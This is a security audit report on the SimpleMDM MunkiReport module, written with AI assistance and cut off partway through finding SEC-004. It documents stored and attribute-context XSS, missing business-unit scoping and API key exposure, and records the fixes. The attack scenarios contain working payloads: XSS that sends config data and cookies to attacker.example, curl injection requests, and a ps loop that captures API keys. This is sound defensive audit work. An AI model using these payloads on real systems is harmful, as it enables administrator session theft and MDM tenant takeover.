# Security Audit Report

**Project:** SimpleMDM MunkiReport module — https://github.com/hov172/SimpleMDM-MunkiReport
**Date:** 2026-08-07
**Auditor:** Claude Code (secure-webapp skill) assisted by hov172
**Audit Type:** Static code review of application source, views, helper scripts and configuration defaults
**Report Version:** 1.0
**Classification:** Internal — Handle Appropriately

---

## Executive Summary

A full static review of the SimpleMDM MunkiReport module examined sixteen candidate issues, of which fifteen were confirmed and one was ruled out. The most significant were three High-severity issues: a stored cross-site scripting path reachable from a device name a user sets on their own Mac, a shared escaping helper that left quotes unescaped while being used inside HTML attributes, and a complete absence of business-unit scoping on module reads that would let any signed-in user read the entire device estate when business units are enabled.

Twelve findings were remediated during this session and verified by test and live request; two Low-severity items remain open by decision; one Low-severity item is accepted risk because it requires a database migration rather than a code change. The module's existing security foundations were found to be sound — constant-time secret comparison, hashed nonces and device tokens, parameterised queries, escaped shell arguments and correct CSRF enforcement were all verified and required no change.

The remediation itself was then re-reviewed, which surfaced two further Medium findings in the new code (SEC-008 and SEC-009) that were also fixed. All work sits on branch `security/audit-remediation-v1.3.6` and is not yet merged to `main`.

### Finding Counts

| Severity | Total Found | Fixed | Open | Accepted Risk | False Positive |
|---|---|---|---|---|---|
| Critical | 0 | 0 | 0 | 0 | 0 |
| High | 3 | 3 | 0 | 0 | 0 |
| Medium | 7 | 6 | 0 | 0 | 1 |
| Low | 6 | 5 | 0 | 1 | 0 |
| Info | 0 | 0 | 0 | 0 | 0 |
| **Total** | **16** | **14** | **0** | **1** | **1** |

### Key Risk Statements

- The most severe confirmed finding (SEC-001) allowed a person with nothing more than the ability to rename their own managed Mac to execute JavaScript in the browser session of any MunkiReport operator who opened the device listing — including global administrators whose sessions can reach configuration save and server-side script execution endpoints.
- After remediation the module has no known Critical, High or Medium exposure; the two remaining open items are Low-severity hardening gaps whose practical exploitability is bounded, and both are documented rather than silently deferred.
- Not covered by this review: dynamic or penetration testing, dependency CVE scanning, the MunkiReport core application beyond the authorisation helpers this module depends on, and dynamic/penetration testing. The two scope gaps recorded at revision 1.0 — dependency scanning and live business-unit verification — have both since been closed; see Appendix A and SEC-003 Verification.

---

## Scope

### Reviewed

- `simplemdm_controller.php` — 7,657 lines at time of audit, approximately 60 public endpoints, including the full authentication and authorisation model, all ingest endpoints, the SimpleMDM API passthrough proxy, the script runner and the configuration save/read paths
- All 14 model classes, in particular `simplemdm_mcp_finding_model.php`
- All 57 view templates under `views/`, with focus on output encoding in every location where server-supplied data reaches the DOM
- `provides.yml` route, widget, listing and client-tab declarations
- `scripts/` — `install_cron.sh`, `simplemdm_sync.py` (inspected for embedded secrets and for its environment-variable interface), the client reporter agents, and the example plists and wrappers
- `.gitignore` and the tracked file list, checked for committed secrets or `.env` files
- MunkiReport core files that define this module's trust boundary: `app/controllers/Module.php`, `app/helpers/site_helper.php`, `app/lib/munkireport/AuthHandler.php`, `app/lib/munkireport/User.php`, `system/kissmvc.php`
- Live behavioural verification against a running instance at `http://localhost:8888` (Docker container `munkireport-local`)

### Not Reviewed

- ~~**Dependency CVE scanning.**~~ Completed 2026-08-08 against Packagist's advisory API; see Appendix A. The module itself is clean and declares no runtime dependencies. MunkiReport core, which is out of scope for this audit, has 22 affected packages and is recorded in Appendix A for the maintainer's attention.
- **Dynamic and penetration testing.** No exploitation was attempted. Every finding in this report was derived by reading code. Where behaviour was confirmed live, it was confirmed against non-destructive requests using legitimate credentials or deliberately invalid ones.
- **`simplemdm_sync.py` internals.** The 58 KB sync script was inspected only for embedded secrets and for its `--api-key` / `SIMPLEMDM_API_KEY` interface. Its request handling, parsing and error paths were not reviewed.
- **MunkiReport core** beyond the authentication and authorisation helpers this module depends on.
- **Infrastructure.** TLS termination, reverse proxy configuration, web server hardening, host security, file permissions in production, and database configuration are all out of scope.
- ~~**Business-unit scoping end to end.**~~ Completed 2026-08-08 via `tests/manual/sec003_business_unit_scoping.php`, which boots the real application, enables business units in-process, builds a fixture estate inside a rolled-back transaction and exercises the real controller as a non-admin session. 21 assertions, all passing. See SEC-003 Verification.
- Migrations, the client reporter macOS agents in operation, and any third-party SaaS integration behaviour on the SimpleMDM side.

### Methodology

- **Approach:** Static source code review and manual code inspection, followed by targeted live verification of remediated behaviour against a running instance
- **Standards:** OWASP Top 10:2025, ASVS 5.0, OWASP Cheat Sheet Series
- **Tools:** `php -l` (syntax), PHPUnit 10.5.64 (unit and guard tests), `bash -n` (shell syntax), `curl` (live endpoint verification), `grep`-based source sweeps for sink and sanitiser patterns
- **Audit threshold:** Not applicable — no automated dependency or lint gate was run; see Not Reviewed

---

## Risk Rating Matrix

| Severity | Definition | Response Target |
|---|---|---|
| **Critical** | Exploitable now with severe business impact: data breach, account takeover, RCE, cross-tenant write | Fix immediately — block release |
| **High** | Exploitable with material impact: auth bypass, persistent XSS, sensitive data leak, SSRF | Fix this sprint |
| **Medium** | Real risk but conditional or limited-impact: requires specific preconditions or attacker access | Fix this quarter |
| **Low** | Best-practice gap with minimal exploitability in isolation | Track and address opportunistically |
| **Info** | Observation only — no direct risk, but worth noting for future hardening | No action required |

---

## Findings Summary

| ID | Title | Severity | OWASP Category | Status | Location |
|---|---|---|---|---|---|
| SEC-001 | Stored XSS in the device listing via SimpleMDM-supplied fields | High | A03 – Injection (XSS) | Fixed | `views/simplemdm_listing.php:272,279,289,351,365` |
| SEC-002 | Shared escaper leaves quotes unescaped and is used inside attributes | High | A03 – Injection (XSS) | Fixed | `views/simplemdm_widget_modern_assets.php` + 12 views |
| SEC-003 | No business-unit scoping on any module read endpoint | High | A01 – Broken Access Control | Fixed | `simplemdm_controller.php` (module-wide) |
| SEC-004 | SimpleMDM API key exposed on the command line and echoed in responses | Medium | A02 – Security Misconfiguration | Fixed | `simplemdm_controller.php` `run_script()`; `scripts/install_cron.sh:133` |
| SEC-005 | Action secret accepted in the URL query string | Medium | A02 – Security Misconfiguration | Fixed | `simplemdm_controller.php` `extract_action_secret_from_request()` |
| SEC-006 | Module download archive ships every file except `.git` | Medium | A01 – Broken Access Control | Fixed | `simplemdm_controller.php` `create_module_archive()` |
| SEC-007 | CSV formula injection in the MCP findings export | Medium | A03 – Injection | Fixed | `simplemdm_controller.php` `export_mcp_findings()` |
| SEC-008 | Throttle state directory in shared temp trusted without validation | Medium | A02 – Security Misconfiguration | Fixed | `simplemdm_controller.php` `throttle_dir()` |
| SEC-009 | Upgrade to 1.3.6 leaves pre-existing crontab key exposure in place | Medium | A02 – Security Misconfiguration | Fixed | `docs/UPGRADE.md` |
| SEC-010 | Raw exception detail returned to clients | Low | A10 – Mishandling of Exceptional Conditions | Fixed | `simplemdm_controller.php` `ingest()`, `download_module()`, supplemental path |
| SEC-011 | No throttling on shared-secret authentication attempts | Low | A07 – Authentication Failures | Fixed | `simplemdm_controller.php` (module-wide) |
| SEC-012 | Client reporter integrity controls defaulted to off | Low | A06 – Insecure Design | Fixed | `simplemdm_controller.php` client reporter accessors |
| SEC-013 | Throttle counter increment is not atomic | Low | A07 – Authentication Failures | Fixed | `simplemdm_controller.php` `record_auth_failure()` |
| SEC-014 | `--env-file` containment check is textual, not canonical | Low | A01 – Broken Access Control | Fixed | `scripts/install_cron.sh` |
| SEC-015 | Dashboard trend exposes estate-wide counts under business units | Low | A01 – Broken Access Control | Accepted Risk | `simplemdm_controller.php` `get_dashboard_trend()` |
| FP-001 | SimpleMDM API proxy assumed to skip TLS verification | Medium | A04 – Cryptographic Failures | False Positive | `simplemdm_controller.php` `simplemdm_api_proxy_request()` |

---

## Confirmed Findings

---

### SEC-001 — Stored XSS in the device listing via SimpleMDM-supplied fields

| Field | Value |
|---|---|
| **Severity** | High |
| **OWASP Category** | A03:2025 – Injection (Cross-Site Scripting) |
| **Status** | Fixed |
| **Location** | `views/simplemdm_listing.php:272, 279, 289, 351, 365` and columns at `:294–334`; `views/simplemdm_resources_listing.php:155–171` |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

The SimpleMDM device listing is a DataTables grid populated from `GET /module/simplemdm/get_data`. Three of its column `render` callbacks concatenated row values directly into HTML strings with no encoding, and four further columns were declared with no `render` callback at all. DataTables assigns cell content as HTML rather than text, so a column without an escaping renderer is itself an injection sink.

Every value involved originates in SimpleMDM and is synchronised into the local `simplemdm` table by `ingest()`. Crucially, `device_name` in SimpleMDM tracks the computer name of the enrolled Mac, which the device's own user can change from System Settings without any administrative privilege in MunkiReport or SimpleMDM. The vulnerable data therefore crosses a trust boundary from the least-privileged actor in the system into an administrative interface.

This violates output encoding discipline: the listing treats data from an external, partially user-controlled system as trusted markup.

#### Evidence

```javascript
// views/simplemdm_listing.php — before fix

// :272  serial_number — raw in both an attribute and a text node
return '<a href="' + href + '" title="' + data + '">' + data + '</a>';

// :279  device_name — raw in a text node, id raw in an attribute
return '<a href="https://a.simplemdm.com/devices/' + full.simplemdm_id
     + '" target="_blank">' + data + ' <i class="fa fa-external-link"></i></a>';

// :289  status — raw
return '<span class="label ' + labelClass + '">' + data + '</span>';

// :351  AppleCare coverage status — raw
chips.push('<span class="label label-default">'
         + String(full.supplemental_applecare_coverage_status) + '</span>');

// :365  supplemental module names — raw
chips.push('<span class="label label-default">' + modules.join(', ') + '</span>');

// :294-334  no render callback at all — DataTables writes these as HTML
{data: 'model_name'},
{data: 'os_version'},
{data: 'last_seen_at'},
{data: 'assignment_group'},
```

#### Attack Scenario

**Threat Actor:** An ordinary end user with a managed Mac enrolled in SimpleMDM. No MunkiReport account is required. Alternatively, a SimpleMDM administrator, or anyone who has compromised a single enrolled endpoint.

**Prerequisites:** The ability to change the computer name on one enrolled Mac, and knowledge (or reasonable assumption) that the organisation runs MunkiReport with this module. No network access to MunkiReport is needed at any point — the payload is delivered by the organisation's own sync job.

**Step-by-step exploitation:**

1. The attacker renames their managed Mac in System Settings → General → About → Name, setting it to a payload such as `<img src=x onerror="fetch('/module/simplemdm/get_config').then(r=>r.text()).then(t=>fetch('https://attacker.example/x',{method:'POST',body:t}))">`.
2. SimpleMDM picks up the new device name at its next device check-in and exposes it through the `/devices` API.
3. The organisation's scheduled `simplemdm_sync.py` run reads that device record and POSTs it to `/module/simplemdm/ingest`, which writes `device_name` verbatim into the local `simplemdm` table. No encoding or validation occurs on ingest, and none is expected to — encoding is an output concern.
4. A MunkiReport operator opens `show/listing/simplemdm`. The listing fetches `get_data` and DataTables assigns the attacker's string as cell HTML. The `img` element fails to load and the `onerror` handler executes in the operator's authenticated session, same-origin with MunkiReport.
5. The payload runs with whatever the operator can do. If the operator is a global administrator, that includes reading `get_config` (which returns the SimpleMDM API key in full for global sessions), calling `save_config`, and invoking `run_script` to execute the sync script server-side. The stolen API key grants full control of the organisation's MDM tenant, up to and including remote wipe of every enrolled device.

**Concrete example payload or request:**

The payload is delivered through the organisation's own sync, but the equivalent direct injection — available to anyone holding the sync token — is:

```bash
curl -X POST 'https://munkireport.example/module/simplemdm/ingest' \
  -H 'X-SIMPLEMDM-API-KEY: <sync token>' \
  -H 'Content-Type: application/json' \
  -d '[{"serial_number":"C02XX0000001",
        "device_name":"<img src=x onerror=alert(document.cookie)>",
        "status":"enrolled"}]'
```

Then load `https://munkireport.example/show/listing/simplemdm` as any authenticated user.

**Business Impact:** Compromise of a MunkiReport administrator session leads directly to disclosure of the SimpleMDM API key, and from there to full administrative control of the mobile device management tenant — device lock, wipe, profile installation and application deployment across the entire managed fleet. For an organisation managing staff or student endpoints, this is a path from one ordinary user to fleet-wide device control, with attendant data protection and regulatory exposure. The attack requires no privilege escalation within MunkiReport itself and leaves the initiating action (a computer rename) looking entirely routine in logs.

**Real-world precedent:** Stored XSS reaching an administrative dashboard through an inventory or asset field is a well-established pattern — the broader class of "self-service field renders in admin console" issues in ITSM, RMM and MDM products has been exploited repeatedly. The DataTables-specific variant, assuming the grid escapes when it does not, has recurred across many applications.

#### Remediation Applied

An `esc()` helper delegating to the new canonical escaper was introduced in the view, every interpolation was wrapped, URL-bearing attributes were routed through `simplemdmEscapeUrl` or `encodeURIComponent`, and every column lacking a renderer was given DataTables' built-in text renderer.

```javascript
// views/simplemdm_listing.php — after fix

function esc(v) {
    return window.simplemdmEscapeHtml(v);
}

// DataTables writes cell content as HTML, so every column that is not
// rendered through esc() must use the built-in text renderer.
var textColumn = $.fn.dataTable.render.text();

// :272 equivalent
return '<a href="' + window.simplemdmEscapeUrl(href) + '" title="'
     + esc(data) + '">' + esc(data) + '</a>';

// :279 equivalent
return '<a href="https://a.simplemdm.com/devices/'
     + encodeURIComponent(String(full.simplemdm_id))
     + '" target="_blank" rel="noopener noreferrer">' + esc(data)
     + ' <i class="fa fa-external-link"></i></a>';

// columns
{data: 'model_name', render: textColumn},
{data: 'os_version', render: textColumn},
{data: 'last_seen_at', render: textColumn},
{data: 'assignment_group', render: textColumn},
```

`views/simplemdm_resources_listing.php` received an equivalent fix across all five of its columns via a shared `escapeCell` renderer that also preserves the previous empty-value dash behaviour.

**Fix rationale:** The root cause is that the listing treated externally-sourced data as markup. Escaping at the point of output — rather than attempting to sanitise on ingest — is correct because the same data is legitimately rendered into several different contexts (text nodes, attributes, URLs), each of which needs a different encoding. Adding `render: textColumn` to the bare columns closes the sink that is easiest to reintroduce, since a column with no renderer looks harmless.

#### Verification

- `OutputEscapingGuardTest::testEveryDataTablesColumnIsEscaped` asserts no bare `{data: 'x'}` column remains in either listing; `testDeviceListingDoesNotInterpolateRawRowData` asserts the raw `+ data +` pattern is gone.
- That guard test caught a sink the manual pass had missed — a raw serial interpolated into the `/clients/detail/` href at `:280` — which was then fixed.
- Full suite: `OK (113 tests, 215 assertions)`.
- `php -l` clean across all modified view files.
- Live: `GET /module/simplemdm/get_data` continues to return all 454 device rows, confirming the render changes did not alter data flow.

---

### SEC-002 — Shared escaper leaves quotes unescaped and is used inside attributes

| Field | Value |
|---|---|
| **Severity** | High |
| **OWASP Category** | A03:2025 – Injection (Cross-Site Scripting) |
| **Status** | Fixed |
| **Location** | `views/simplemdm_device.php:420,535,565,566,647`; `views/simplemdm_admin.php:1280,1672,2416,2417,2419`; `views/simplemdm_group_apps_widget.php:128,310`; plus the same helper duplicated in 9 further views |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

Twelve views each carried a private copy of the same escaping helper:

```javascript
function esc(v) { return $('<div>').text(String(v)).html(); }
```

This works by assigning the value as a DOM text node and reading back the serialised `innerHTML`. That serialisation escapes `&`, `<` and `>` — but deliberately does **not** escape `"` or `'`, because inside a text node quotes carry no meaning. The helper is therefore correct for text-node output and unsafe for attribute output.

It was being used for attribute output in numerous places. Because `esc()` returns a string that still contains any double quote present in the input, a value placed inside `href="…"`, `title="…"` or `data-*="…"` can terminate the attribute and introduce a new one — including an event handler.

The most directly exploitable instance was in `renderOverviewValue()` on the device detail page, where a scheme check on the value gave the misleading appearance of safety.

#### Evidence

```javascript
// views/simplemdm_device.php:420 — the helper
function esc(val) {
    return $('<div>').text(String(val)).html();   // " and ' pass through
}

// views/simplemdm_device.php:535 — attribute context
function renderOverviewValue(val) {
    if (typeof val === 'string' && /^https?:\/\//i.test(val)) {
        return '<a href="' + esc(val) + '" target="_blank" rel="noopener noreferrer">'
             + esc(val) + '</a>';
    }
    return esc(val);
}

// views/simplemdm_admin.php:1672 — attribute context
'<div class="simplemdm-runs-summary" title="' + escapeHtml(label) + '">' + ...

// views/simplemdm_admin.php:2417 — data-* attribute context
'<button ... data-command="' + $('<div>').text(script.external_command || '').html() + '">'
```

#### Attack Scenario

**Threat Actor:** Anyone able to set a SimpleMDM device attribute value that is later rendered on the device detail page — an end user via device-reported attributes, a SimpleMDM administrator, or an attacker who has compromised one enrolled endpoint or the SimpleMDM tenant.

**Prerequisites:** One device attribute whose value both begins with `http://` or `https://` (to satisfy the scheme test at `:535`) and contains a double quote. A MunkiReport operator subsequently opening that device's detail page.

**Step-by-step exploitation:**

1. The attacker sets a device attribute — for example a custom attribute, or any synced field surfaced in the overview section — to:
   `https://example.com" onmouseover="fetch('https://attacker.example/'+document.cookie)`
2. The value passes the `/^https?:\/\//i` test at `:535`, so the code takes the anchor branch. This scheme check is why the code looks safe: it correctly blocks `javascript:` URLs, which is the attack most reviewers look for here.
3. `esc(val)` escapes nothing in this string — it contains no `<`, `>` or `&` — so the double quote survives intact.
4. The emitted markup becomes `<a href="https://example.com" onmouseover="fetch('https://attacker.example/'+document.cookie)" target="_blank" ...>`. The attacker's attribute is now a real event handler on a real element.
5. An operator opens the device page and moves the pointer across the link. The handler fires in their authenticated session. As with SEC-001, a global administrator session leads to the SimpleMDM API key via `get_config`.

**Concrete example payload or request:**

```bash
# Any attribute rendered by renderOverviewValue() on the device page
curl -X POST 'https://munkireport.example/module/simplemdm/ingest' \
  -H 'X-SIMPLEMDM-API-KEY: <sync token>' \
  -H 'Content-Type: application/json' \
  -d '[{"serial_number":"C02XX0000001",
        "attributes_json":{"support_url":"https://example.com\" onmouseover=\"alert(document.domain)"}}]'
```

**Business Impact:** Identical downstream impact to SEC-001 — administrator session compromise leading to MDM tenant takeover. This finding is rated High separately because it is systemic rather than localised: the same defective helper was present in twelve files, so any future attribute interpolation written in the established house style would have been vulnerable by default. It is the kind of defect that reintroduces itself.

**Real-world precedent:** Attribute-context escaping failures are a distinct and long-recognised XSS class; the OWASP XSS Prevention Cheat Sheet devotes a separate rule to attribute contexts precisely because HTML-entity escaping tuned for text nodes is insufficient there. The specific `textContent` / `innerHTML` round-trip idiom appears in many codebases as a "safe escape" and carries this exact flaw.

#### Remediation Applied

A single canonical escaper was added to the shared asset file that every affected view already includes, and all twelve local helpers were reduced to delegating one-liners. A companion URL escaper was added for `href`/`src` values.

```javascript
// views/simplemdm_widget_modern_assets.php — after fix
var simplemdmHtmlEntities = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
};

window.simplemdmEscapeHtml = function(value) {
    return String(value === null || value === undefined ? '' : value)
        .replace(/[&<>"']/g, function(char) {
            return simplemdmHtmlEntities[char];
        });
};

// Only http(s) and relative URLs survive; anything else collapses to '#'.
window.simplemdmEscapeUrl = function(value) {
    var raw = String(value === null || value === undefined ? '' : value).trim();
    if (raw === '') { return '#'; }
    if (/^[a-z][a-z0-9+.-]*:/i.test(raw) && !/^https?:/i.test(raw)) { return '#'; }
    return window.simplemdmEscapeHtml(raw);
};
```

The device page's URL branch now uses the URL escaper:

```javascript
return '<a href="' + window.simplemdmEscapeUrl(val)
     + '" target="_blank" rel="noopener noreferrer">' + esc(val) + '</a>';
```

The same sweep found and fixed eleven additional widgets that were interpolating group names, resource type names, OS versions, AppleCare status and sync telemetry with no escaping whatsoever.

**Fix rationale:** Consolidating to one escaper that is safe in both text and attribute contexts removes the need for each call site to reason about which context it is in — the failure mode that produced this bug. Escaping both quote characters makes the single helper correct everywhere it is used. `simplemdmEscapeUrl` additionally defends the `href` sink against scheme-based payloads, which quote-escaping alone would not stop.

#### Verification

- `OutputEscapingGuardTest::testCanonicalEscaperExistsAndEscapesQuotes` asserts all five entity mappings, including `&quot;` and `&#39;`, are present.
- `testNoViewUsesTheQuoteUnsafeEscaper` sweeps every view and fails if the `$('<div>').text(v).html()` idiom reappears, with JS line comments stripped so the explanatory comment in the asset file does not trip it.
- Manual sweep after the change confirmed zero remaining occurrences of the pattern across `views/*.php`.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-003 — No business-unit scoping on any module read endpoint

| Field | Value |
|---|---|
| **Severity** | High |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` — `get_data()`, `get_simplemdm_data()`, `get_supplemental_data()`, `get_device_resources()`, `get_device_subresources()`, `get_mcp_findings()`, `get_events()`, `export_mcp_findings()`, `device()`, and the statistical aggregates |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

MunkiReport core scopes machines to a user's machine groups, and with `enable_business_units` set, to their business unit. Core provides `authorized_for_serial()` and `get_machine_group_filter()` in `app/helpers/site_helper.php` for exactly this purpose.

This module queries its own `simplemdm*` tables directly rather than going through core's listing helpers, so none of that filtering applied to it. A source-wide search confirmed zero uses of either helper and zero references to `machine_group` anywhere in the module; the only contact with core's `reportdata` table was a `leftJoin` used solely to compute a `has_reportdata` display flag.

The module's only gate was the constructor's bare `$this->authorized()` call, which core resolves to "any user holding a valid session". Every endpoint below that gate returned data for the entire estate.

#### Evidence

```php
// simplemdm_controller.php:66 — the only authorisation gate
if (! $is_sync_action && ! $this->authorized()) {
    die('Authenticate first.');
}

// get_data() — before fix: no machine group constraint anywhere
$query = Simplemdm_model::select(
    'simplemdm.serial_number', 'simplemdm.simplemdm_id', 'simplemdm.device_name', /* ... */
)
    ->selectRaw("CASE WHEN reportdata.serial_number IS NULL THEN 0 ELSE 1 END AS has_reportdata")
    ->leftJoin('reportdata', 'reportdata.serial_number', '=', 'simplemdm.serial_number');
jsonView($query->get()->toArray());

// get_mcp_findings() — before fix: serial taken from the URL, no ownership check
public function get_mcp_findings($serial_number = '')
{
    $query = Simplemdm_mcp_finding_model::orderBy('id', 'desc')->limit($limit)->offset($offset);
    $serial_number = trim((string) $serial_number);
    if ($serial_number !== '') {
        $query->where('serial_number', $serial_number);
    }
```

#### Attack Scenario

**Threat Actor:** Any authenticated MunkiReport user — in a business-unit deployment, a person deliberately restricted to one department, site, school or customer.

**Prerequisites:** A valid MunkiReport session of any role, and `enable_business_units` set to true (otherwise core grants all users all machine groups and there is no separation to breach).

**Step-by-step exploitation:**

1. The attacker signs in with their ordinary restricted account and confirms that core's own views correctly show only their business unit's machines — establishing that the boundary exists and is expected to hold.
2. They navigate to the SimpleMDM listing, or simply request `GET /module/simplemdm/get_data` directly. The response contains every device in the install, across every business unit: serial numbers, device names, OS versions, assignment groups, FileVault and supervision state, and last-seen timestamps.
3. To target a specific out-of-scope machine, they request `GET /module/simplemdm/get_mcp_findings/<serial>` with a serial harvested in step 2. The module returns that device's security findings — which by design describe its weaknesses — with no ownership check.
4. `GET /module/simplemdm/export_mcp_findings?format=csv` yields up to 10,000 findings for the whole estate in one request, and `get_client_facts`, `get_device_resources` and `get_events` disclose further per-device detail.
5. The attacker now holds a security-posture map of machines they are contractually or organisationally barred from seeing — which devices lack FileVault, which are unsupervised, which have unresolved danger-severity findings — plus the serials needed to act on it.

**Concrete example payload or request:**

```bash
# As a user restricted to a single business unit:
curl -b "$SESSION" 'https://munkireport.example/module/simplemdm/get_data' | jq length
# -> returns the whole estate, not the caller's unit

curl -b "$SESSION" \
  'https://munkireport.example/module/simplemdm/get_mcp_findings/<other-unit-serial>'
# -> returns that device's findings

curl -b "$SESSION" \
  'https://munkireport.example/module/simplemdm/export_mcp_findings?format=csv' \
  -o whole-estate-findings.csv
```

**Business Impact:** In multi-tenant deployments — a managed service provider serving several clients, a school district covering several schools, or a company separating departments — this is a cross-tenant confidentiality breach. The disclosed data is precisely the data that identifies weak targets. For an MSP it represents a contractual and potentially regulatory failure, since one client can enumerate another client's device estate and its security gaps.

**Real-world precedent:** Broken access control has topped the OWASP Top 10 since 2021, and "second application queries the shared database directly, bypassing the primary application's tenant filter" is among the most common concrete forms. Plugin and module ecosystems are especially prone to it because the host application's scoping is implicit rather than enforced at the data layer.

#### Remediation Applied

Four helpers were added and applied across the read surface.

```php
// Gate: when does scoping apply at all?
private function machine_scope_enabled()
{
    if ($this->token_read_request === true) {
        return false;                       // headless sync clients have no session
    }
    if (! function_exists('conf') || ! conf('enable_business_units', false)) {
        return false;
    }
    return ! $this->authorized('global');   // global admins see everything anyway
}

// Per-serial ownership check; 404 rather than 403 so the response cannot be
// used to probe which serials exist outside the caller's scope.
private function require_serial_access($serial_number)
{
    if (! $this->machine_scope_enabled()) { return true; }
    $serial_number = trim((string) $serial_number);
    if ($serial_number === '') { return true; }
    if (! function_exists('authorized_for_serial') || authorized_for_serial($serial_number)) {
        return true;
    }
    jsonView(['status' => 'error', 'message' => 'Not found'], 404);
    return false;
}

// Query-level scoping, mirroring core's get_machine_group_filter().
private function scope_to_machine_groups($query, $serial_column)
{
    if (! $this->machine_scope_enabled() || ! function_exists('get_filtered_groups')) {
        return $query;
    }
    if (! isset($_SESSION['machine_groups'])) { return $query; }
    $groups = get_filtered_groups();
    if (! is_array($groups) || ! $groups) { return $query; }
    $groups = array_values(array_map('intval', $groups));

    return $query->whereIn($serial_column, function ($sub) use ($groups) {
        $sub->select('serial_number')->from('reportdata')->whereIn('machine_group', $groups);
    });
}
```

A fourth helper, `machine_group_sql_filter()`, emits the equivalent constraint as a SQL fragment for the two aggregates written as raw PDO queries, with group ids cast through `intval` before interpolation.

**Fix rationale:** Query-level scoping is preferred over post-filtering because it cannot be bypassed by a code path that forgets to filter — the constraint travels with the query. `require_serial_access()` answers 404 rather than 403 so that the response does not confirm the existence of out-of-scope serials.

The gate on `enable_business_units` is the load-bearing design decision. With business units disabled, core's `AuthHandler` grants every user every machine group, so scoping would change exactly one behaviour: it would hide SimpleMDM devices that have no MunkiReport record at all. Such devices are common in this deployment — an MCP-only serial has no `reportdata` row, so its `machine_group` is `NULL` and matches no group. Unconditional scoping would have made those devices vanish from the dashboard for every non-administrative user, converting a security fix into a functional regression.

#### Verification

- `MachineScopeGuardTest` asserts the helpers exist, that scoping remains gated on `enable_business_units`, that global admins and token callers are exempt, that all seven serial-scoped endpoints call `require_serial_access()`, that list and export queries remain scoped, and that group ids are `intval`-cast before reaching raw SQL.
- Live regression check with business units disabled: `get_data` returns 454 devices, `get_mcp_finding_stats` returns 197 open findings, `get_assignment_group_stats` returns named groups — all unchanged from before the fix, confirming no over-scoping in the default configuration.
- Full suite: `OK (115 tests, 222 assertions)`.
- **Live verification, 2026-08-08** (`tests/manual/sec003_business_unit_scoping.php`, 21/21 passing). Boots the real application, enables business units in-process, and inserts a fixture estate inside a transaction that is always rolled back: two serials in the caller's machine group, one in another group, and one present in `simplemdm` with no `reportdata` row at all (the MCP-only shape). It then drives the real controller with a non-admin session restricted to a single group:

  | Assertion | Result |
  |---|---|
  | `machine_scope_enabled()` with BUs on and a non-admin caller | `true` |
  | `require_serial_access()` on an in-scope serial | allowed, no body emitted |
  | `require_serial_access()` on an out-of-scope serial | denied, body `Not found` |
  | `scoped_devices()` over all four fixtures | returns only the two in-group serials |
  | `scoped_findings()` over all four fixtures | returns only the two in-group serials |
  | `machine_group_sql_filter()` | emits `machine_group IN (9101)` — int-cast |
  | `get_mcp_findings()` list | scoped to the two in-group serials |
  | `get_mcp_findings(<out-of-scope serial>)` | `Not found` |
  | Sync-token caller | exempt; out-of-scope serial allowed |
  | Global admin | exempt |
  | Business units disabled | scoping off, and the orphan serial visible again |

  The last two rows matter most: they confirm the exemptions the design depends on, and that the MCP-only device — which has no `reportdata` row and would vanish under unconditional scoping — remains visible when business units are off. Residue check after the run: `reportdata` 1 row, `simplemdm` 454, findings 211 — unchanged, and zero rows matching the fixture prefixes.

---

### SEC-004 — SimpleMDM API key exposed on the command line and echoed in responses

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `run_script()` command table and response; `scripts/install_cron.sh:133` |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` (code), `708a542` (upgrade remediation — see SEC-009) |

#### Description

`run_script()` interpolated the stored SimpleMDM API key into the shell command string for three of its four actions, executed that string via `proc_open`, and then returned the assembled command verbatim in its JSON response. `install_cron.sh` performed the same interpolation when writing the crontab entry.

The arguments were correctly `escapeshellarg`'d, so this was never a command injection issue — it is purely an exposure issue. Process arguments are world-readable on both Linux (`/proc/<pid>/cmdline`) and macOS (`ps`), so for the duration of every sync the key was visible to any local account on the server. The crontab variant made that exposure permanent rather than momentary.

#### Evidence

```php
// simplemdm_controller.php — before fix
$api_key = escapeshellarg($this->get_stored_api_key());

$commands = [
    'sync_now' => sprintf(
        "%s %s --api-key %s --munkireport-url %s --run-source in_module_immediate ...",
        $python, $sync_script, $api_key, $mr_url, $max_parent_resources
    ),
    // 'print_cron' and 'install_cron' likewise
];

$result = $this->run_local_script_command($commands[$action], $cwd);

jsonView([
    'status'    => $result['ok'] ? 'success' : 'error',
    'action'    => $action,
    'command'   => $commands[$action],   // <-- key returned to the browser
    'exit_code' => $result['exit_code'],
    'stdout'    => $result['stdout'],
    'stderr'    => $result['stderr'],
], $result['ok'] ? 200 : 500);
```

```bash
# scripts/install_cron.sh:133 — before fix
CRON_CMD="$PYTHON_BIN $SYNC_SCRIPT --api-key '$SIMPLEMDM_API_KEY' --munkireport-url '$MUNKIREPORT_URL' ..."
```

#### Attack Scenario

**Threat Actor:** Any local account on the MunkiReport server — a low-privilege service account, a shared-hosting neighbour, a developer with shell access but no MunkiReport administrative role, or an attacker who has achieved limited code execution through an unrelated vulnerability.

**Prerequisites:** The ability to run a process on the host. No MunkiReport credentials of any kind.

**Step-by-step exploitation:**

1. The attacker establishes any foothold that permits running commands as any user — a low-privilege web service account is sufficient.
2. If the cron entry was installed, the key is available immediately and without timing: `crontab -l -u www-data` where permitted, or by reading the spool file, or simply `ps auxww | grep simplemdm_sync` during any scheduled run.
3. Failing that, they poll for the sync process: `while :; do ps auxww | grep -o -- '--api-key [^ ]*'; sleep 0.2; done`. The scheduled sync runs as often as every minute in the documented configuration, so the wait is short.
4. The key is captured. It is the SimpleMDM tenant API key, not a MunkiReport credential, so it is usable directly against `https://a.simplemdm.com/api/v1/` from anywhere on the internet.
5. The attacker enumerates the fleet, and — depending on the key's permissions — issues device commands including lock and erase, pushes configuration profiles, or installs applications across every enrolled device.

